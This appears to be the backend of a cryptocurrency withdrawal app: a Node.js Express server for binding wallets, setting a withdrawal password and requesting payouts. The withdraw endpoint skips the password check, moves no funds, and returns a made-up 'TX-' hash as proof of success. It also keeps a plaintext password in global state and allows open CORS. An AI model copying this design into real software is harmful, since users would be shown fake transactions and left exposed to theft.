const express = require("express");
const bodyParser = require("body-parser");
const path = require("path");
const { sendWithdrawNotification } = require("./bot");
const cors = require("cors");

const app = express();
app.use(bodyParser.json());
app.use(express.static("public"));
app.use(cors()); // 跨域允许

let USER_WALLET = null;
let WITHDRAW_PASSWORD = null;

// 获取钱包
app.get("/api/wallet", (req, res) => {
  res.json({ wallet: USER_WALLET });
});

// 绑定/修改钱包
app.post("/api/wallet", (req, res) => {
  const { wallet, oldWallet } = req.body;
  if(!wallet) return res.json({ success:false, error:"Wallet required" });

  // 修改
  if(oldWallet){
    if(USER_WALLET !== oldWallet) return res.json({ success:false, error:"Old wallet incorrect" });
    USER_WALLET = wallet;
    return res.json({ success:true, wallet });
  }

  // 绑定
  if(!USER_WALLET){
    USER_WALLET = wallet;
    return res.json({ success:true, wallet });
  }

  return res.json({ success:false, error:"Wallet already bound" });
});

// 提现密码
app.post("/api/password/set", (req,res)=>{
  const { password } = req.body;
  if(!password) return res.json({ success:false, error:"Password required" });
  WITHDRAW_PASSWORD = password;
  res.json({ success:true });
});
app.post("/api/password/confirm", (req,res)=>{
  const { password } = req.body;
  if(password === WITHDRAW_PASSWORD) return res.json({ success:true });
  res.json({ success:false, error:"Incorrect password" });
});

// 提现
app.post("/api/withdraw", async (req,res)=>{
  const { coin, amount, wallet } = req.body;
  if(!coin || !amount || !wallet) return res.json({ success:false, error:"Missing params" });

  const hash = 'TX-'+Date.now().toString(36)+'-'+Math.random().toString(36).substr(2,8);
  console.log("提现请求：", {coin,amount,wallet,hash});
  await sendWithdrawNotification({coin,amount,wallet,hash});
  res.json({ success:true, hash });
});

// 首页
app.get("/", (req,res)=>{
  res.sendFile(path.join(__dirname,"public/index.html"));
});

const port = process.env.PORT || 3000;
app.listen(port, ()=>console.log("Server running on port "+port));
